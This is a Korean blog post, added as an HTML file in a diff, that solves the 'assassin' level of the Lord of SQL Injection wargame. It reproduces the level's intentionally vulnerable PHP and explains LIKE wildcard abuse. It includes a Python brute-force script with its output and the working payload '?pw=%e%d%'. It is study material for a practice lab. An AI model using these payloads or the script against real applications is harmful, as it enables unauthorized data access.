@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@100;300;400;500;700;900&display=swap"
+    rel="stylesheet">
+
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+
+    <base href="">
+    <title> mingzzi&#39;s blog </title>
+    <meta name="description" content="this is description">
+
+    <link rel="canonical" href="/wargame/load-of-sql-injection/2018-08-03-los-assassin/">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />
+
+    
+    <link rel="stylesheet" href="/sass/main.min.1180c1166ae9fce8b9694d59f69d3fa2f4d9bae4788aa2f550a7a1c42a7c734c.css">
+
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+
+
+    <link rel="stylesheet" type="text/css"
+        href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+
+
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js"
+        integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-130304424-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'UA-130304424-1');
+    </script>
+
+    
+    <script data-ad-client="ca-pub-1587587893565234" async
+        src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+    <script>
+        $(function () {
+            $(".cat1>li").click(function () {
+                $(this).siblings().find('ul').slideUp(300);
+                $(this).find('ul').slideToggle(300);
+            })
+
+            $(window).scroll(function () {
+                activeBg();
+            });
+
+            activeBg();
+
+
+            $('.h-menu').click(function (e) {
+                e.preventDefault();
+                $('.side').addClass('on');
+            });
+
+            $('.close').click(function (e) {
+                e.preventDefault();
+                $('.side').removeClass('on');
+            });
+
+            $('ul.slide>li').click(function () {
+                if ($(this).find('.down').hasClass('on')) {
+                    $(this).find('.down').removeClass('on');
+                    $(this).find('.down').prev().stop().slideUp(500);
+                } else {
+                    $(this).find('.down').addClass('on');
+                    $(this).find('.down').prev().stop().slideDown(500);
+                }
+            })
+        })
+
+        function activeBg() {
+            if ($(window).scrollTop() > 0) {
+                $('.site-header').addClass('on');
+            } else {
+                $('.site-header').removeClass('on');
+            }
+        }
+
+    </script>
+</head>
+<header class="site-header">
+    <h1 class="web-t" onclick="window.location.href='/'"><span>def</span><em> 천방지축 얼렁뚱땅
+        </em><span>(</span><i>🤣</i><span>)</span>:<br />
+        &nbsp;&nbsp;&nbsp;&nbsp;<span class="nbsp">title =</span> 빙글빙글 돌아가는 우당탕탕 시큐로그
+        <br />
+    </h1>
+
+    <h1 class="mob-t" onclick="window.location.href='/'">
+        <span>천/얼/빙/돌(</span><i>🤣</i><span>)</span>
+        <br />우당탕탕 시큐로그
+    </h1>
+
+    <nav>
+        <div class="h-menu">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="side">
+            <div class="close">
+                <span></span>
+                <span></span>
+            </div>
+            <ul class="slide">
+                <li class="on"><a href="#">All Post</a>
+                </li>
+                <li><a href="#">Pentesting</a>
+                    <ul>
+                        <li><a href="#">iOS</a></li>
+                        <li><a href="#">Android</a></li>
+                        <li><a href="#">Web</a></li>
+                        <li><a href="#">Cloud</a></li>
+                    </ul>
+                    <span class="down"></span>
+                </li>
+                <li><a href="#">Wargame</a>
+                    <ul>
+                        <li><a href="#">Load of SQL Injection</a></li>
+                        <li><a href="#">OWASP-MSTG</a></li>
+                        <li><a href="#">Pwnable.kr</a></li>
+                        <li><a href="#">Wargame.kr</a></li>
+                        <li><a href="#">XSS Game</a></li>
+                    </ul>
+                    <span class="down"></span>
+                </li>
+                <li><a href="#">CTF</a>
+                    <ul>
+                        <li><a href="#">2018</a></li>
+                        <li><a href="#">2019</a></li>
+                    </ul>
+                    <span class="down"></span>
+                </li>
+                <li><a href="#">Error</a>
+                    <ul>
+                        <li><a href="#">Linux</a></li>
+                        <li><a href="#">Windows</a></li>
+                        <li><a href="#">Python</a></li>
+                    </ul>
+                    <span class="down"></span>
+                </li>
+                <li><a href="#">Development</a>
+                    <ul>
+                        <li><a href="#">Database</a></li>
+                        <li><a href="#">Github Blog</a></li>
+                        <li><a href="#">Web</a></li>
+                        <li><a href="#">Docker</a></li>
+                        <li><a href="#">Basic</a></li>
+                        <li><a href="#">Secure Coding</a></li>
+                    </ul>
+                    <span class="down"></span>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</header>
+
+<body>
+    <div class="content">
+        
+        
+
+<article>
+    <header>
+        <h1 class="title">[Lord of SQL Injection] LoS - assassin 문제풀이</h1>
+        <p class="meta">
+            0001-01-01
+        </p>
+    </header>
+    <section class="post-content"><p>이번에는 문제 이름이 몬스터 이름이 아니다.</p>
+<p><code>assassin</code> 문제인데, 개인적으로 재밌던 문제이다.</p>
+<p>코드는 다음과 같다.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">----------------------------------------------------------------------
+query : select id from prob_assassin where pw like &#39;&#39;
+----------------------------------------------------------------------
+
+<span style="color:#ff79c6">&lt;?php</span> 
+  <span style="color:#ff79c6">include</span> <span style="color:#f1fa8c">&#34;./config.php&#34;</span>; 
+  login_chk(); 
+  dbconnect(); 
+  <span style="color:#ff79c6">if</span>(preg_match(<span style="color:#f1fa8c">&#39;/\&#39;/i&#39;</span>, <span style="color:#8be9fd;font-style:italic">$_GET</span>[pw])) <span style="color:#ff79c6">exit</span>(<span style="color:#f1fa8c">&#34;No Hack ~_~&#34;</span>); 
+  <span style="color:#8be9fd;font-style:italic">$query</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;select id from prob_assassin where pw like &#39;</span><span style="color:#f1fa8c">{</span>$_GET[pw]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;&#34;</span>; 
+  <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;hr&gt;query : &lt;strong&gt;</span><span style="color:#f1fa8c">{</span>$query<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&#34;</span>; 
+  <span style="color:#8be9fd;font-style:italic">$result</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>mysql_fetch_array(mysql_query(<span style="color:#8be9fd;font-style:italic">$query</span>)); 
+  <span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$result</span>[<span style="color:#f1fa8c">&#39;id&#39;</span>]) <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;h2&gt;Hello </span><span style="color:#f1fa8c">{</span>$result[id]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;/h2&gt;&#34;</span>; 
+  <span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$result</span>[<span style="color:#f1fa8c">&#39;id&#39;</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;admin&#39;</span>) solve(<span style="color:#f1fa8c">&#34;assassin&#34;</span>); 
+  highlight_file(__FILE__); 
+<span style="color:#ff79c6">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>필터링이 <code>'(싱글쿼터)</code> 딱 한개만 있다.</p>
+<p>그리고 <code>=</code> 대신에 <code>like</code>이 쓰였다.</p>
+<p>처음에는 <code>'</code>를 우회하는 방법이 있을 거라고 생각 해 이 부분에 초점을 맞추어 문제를 풀어보려 했다.</p>
+<p>그런데 아무리 해도 우회를 하는 방법을 찾을수가 없었다.</p>
+<p>그러다 눈에 띈 부분이 왜 <code>=</code>가 아니라 <code>like</code>을 사용 했을까 였다.</p>
+<p>나는 단순히 <code>=</code>와 <code>like</code>가 동일하다고 생각했는데, 뭔가 다른 점이 있을 것 같았다.</p>
+<p>그래서 구글에 <code>mysql like</code>이라고 검색을 해봤는데, <code>%</code>를 알게 되었다.</p>
+<p><code>like</code>을 사용한다면, <code>%</code>를 이용 해 특정 문자가 있는 행을 추출할 수 있다.</p>
+<p>예를 들어 아래와 같은 쿼리문이 있다고 가정해보자.</p>
+<pre><code>select * from user where id like '%a%';
+</code></pre><p>이 경우, <code>%</code>는 <code>모든 문자</code>를 의미하게 된다.</p>
+<p>때문에 <code>%a%</code>라고 한다면, <code>a</code>의 앞뒤로 어떠한 문자가 있는 경우를 말한다.</p>
+<p>즉, <code>man</code>, <code>woman</code> 등은 <code>a</code>의 앞뒤로 문자가 있어 조건에 부합하게 된다.</p>
+<p>반면 <code>apple</code>는 <code>a</code>의 앞에 문자가 없기 때문에 조건에 맞지 않는다.</p>
+<p>그래서 이 방법을 가지고 <code>assassin</code> 문제를 풀기로 했다.</p>
+<p>가장 먼저 테스트 한 것은 그냥 <code>%</code>만 입력 해 보는 것이었다.</p>
+<p><code>pw</code>에 분명 문자가 있을테니, <code>pw</code>에 <code>뭐라도 문자가 있는 행</code>을 추출 해 보려 했다.</p>
+<p>그런데 <code>Hello guest</code>가 출력되었다.</p>
+<p>아마도 테이블에 <code>guest</code>가 <code>admin</code>보다 위에 있어 먼저 추출 된 것 같다.</p>
+<p>그래서 이번에는 <code>%a%</code> 형태로 만들어서 하나하나 테스트 해 보기로 했다.</p>
+<p>손으로 하려다가 귀찮아져서 아래와 같이 코드를 구현했다.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> urllib2
+<span style="color:#ff79c6">import</span> urllib
+<span style="color:#ff79c6">import</span> requests
+
+flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
+length <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+
+url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=%&#34;</span>
+session <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">dict</span>(PHPSESSID <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;YOUR SESSION ID&#34;</span>)
+
+<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Start&#34;</span>
+
+<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Find password&#34;</span>
+
+<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">48</span>, <span style="color:#bd93f9">128</span>):
+	<span style="color:#ff79c6">try</span>:
+		query <span style="color:#ff79c6">=</span> url <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">chr</span>(i) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;%&#34;</span>
+		r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(query, cookies<span style="color:#ff79c6">=</span>session)
+	<span style="color:#ff79c6">except</span>:
+		<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[-] Error occur&#34;</span>
+		<span style="color:#ff79c6">continue</span>
+
+	<span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;Hello admin&#39;</span> <span style="color:#ff79c6">in</span> r<span style="color:#ff79c6">.</span>text:
+		flag <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(i)
+		<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Found :&#34;</span>, flag
+
+<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Found password : &#34;</span>, flag
+<span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] End&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>그런데 결과가 안나왔다.(눙물&hellip;)</p>
+<p>그래서 이번에는 <code>Hello guest</code>가 출력되는 문자를 찾도록 조건문을 수정 해 다시 테스트 해 보았다.</p>
+<p>그 결과 아래와 같은 문자들을 얻을 수 있었다.</p>
+<pre><code>$ python ex.py 
+[+] Start
+[+] Find password
+[+] Found : 0
+[+] Found : 01
+[+] Found : 012
+[+] Found : 0129
+[+] Found : 0129D
+[+] Found : 0129DE
+[+] Found : 0129DEF
+[+] Found : 0129DEF_
+[+] Found : 0129DEF_d
+[+] Found : 0129DEF_de
+[+] Found : 0129DEF_def
+[+] Found password :  0129DEF_def
+[+] End
+</code></pre><p>아마도 테이블에서 <code>guest</code>와 <code>admin</code>의 <code>pw</code>가 같은 문자들로만 이루어져 있고, <code>guest</code>가 <code>admin</code>보다 위에 있어 <code>guest</code>만 출력되는 것 같다.</p>
+<p>그래서 저 문자를 적절하게 조합하면 <code>admin</code>을 얻을 수 있지 않을까 생각 해, 이것저것 시도 해 보다 보니 아래와 같이 입력했을 때 문제를 풀 수 있었다.</p>
+<pre><code>?pw=%e%d%
+</code></pre><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">-------------------------------------------------------------------------------
+query : select id from prob_assassin where pw like &#39;%e%d%&#39;
+-------------------------------------------------------------------------------
+
+Hello admin
+ASSASSIN Clear!
+<span style="color:#ff79c6">&lt;?php</span> 
+  <span style="color:#ff79c6">include</span> <span style="color:#f1fa8c">&#34;./config.php&#34;</span>; 
+  login_chk(); 
+  dbconnect(); 
+  <span style="color:#ff79c6">if</span>(preg_match(<span style="color:#f1fa8c">&#39;/\&#39;/i&#39;</span>, <span style="color:#8be9fd;font-style:italic">$_GET</span>[pw])) <span style="color:#ff79c6">exit</span>(<span style="color:#f1fa8c">&#34;No Hack ~_~&#34;</span>); 
+  <span style="color:#8be9fd;font-style:italic">$query</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;select id from prob_assassin where pw like &#39;</span><span style="color:#f1fa8c">{</span>$_GET[pw]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;&#34;</span>; 
+  <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;hr&gt;query : &lt;strong&gt;</span><span style="color:#f1fa8c">{</span>$query<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&#34;</span>; 
+  <span style="color:#8be9fd;font-style:italic">$result</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>mysql_fetch_array(mysql_query(<span style="color:#8be9fd;font-style:italic">$query</span>)); 
+  <span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$result</span>[<span style="color:#f1fa8c">&#39;id&#39;</span>]) <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;h2&gt;Hello </span><span style="color:#f1fa8c">{</span>$result[id]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;/h2&gt;&#34;</span>; 
+  <span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">$result</span>[<span style="color:#f1fa8c">&#39;id&#39;</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;admin&#39;</span>) solve(<span style="color:#f1fa8c">&#34;assassin&#34;</span>); 
+  highlight_file(__FILE__); 
+<span style="color:#ff79c6">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>ASSASSIN Clear!!</code></p></section>
+    <footer>
+    <div class="tags">
+        
+        <a href="/tags#Write-up">#Write-up</a>
+        
+        <a href="/tags#Lord%20of%20SQL%20Injection">#Lord of SQL Injection</a>
+        
+    </div>
+</footer>
+</article>
+
+<div class="comments">
+    <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'mingzzis-blog';
+    (function () {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+</div>
+
+<div id="post-nav">
+    <div id="previous-post" class="post-nav-post">
+        
+        <p>Previous post</p>
+        <a href="/wargame/load-of-sql-injection/2019-07-03-los-banshee/">[Lord of SQL Injection] LoS - banshee 문제풀이</a>
+        
+    </div>
+
+    <div id="next-post" class="post-nav-post">
+        
+        <p>Next post</p>
+        <a href="/wargame/load-of-sql-injection/2018-09-19-los-alien/">[Lord of SQL Injection] LoS - alien 문제풀이</a>
+        
+    </div>
+</div>
+
+
+    </div>
+    <ul class='social'>
+    
+    <li>
+        <a href="https://www.github.com/ATFutures" class="icon alt" target="_blank">
+            <i class="fa fa-github fa-2x"></i>
+        </a>
+    </li>
+    
+    <li>
+        <a href="https://www.github.com/ATFutures" class="icon alt" target="_blank">
+            <i class="fa fa-instagram fa-2x"></i>
+        </a>
+    </li>
+    
+</ul>
+<footer class="site-footer">
+    <p ckass="text">Powered by <a href="https://mingzz1.github.io" target="_blank">mingzzi</a> with <a
+            href="https://myun-d.github.io/" target="_blank">myund</a></p>
+</footer>
+    <script id="dsq-count-scr" src="//mingzzis-blog.disqus.com/count.js" async></script>
+
+    
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-130304424-1']);
+    _gaq.push(['_trackPageview']);
+    (function () {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+    
+</body>
+</body>
+
+</html>
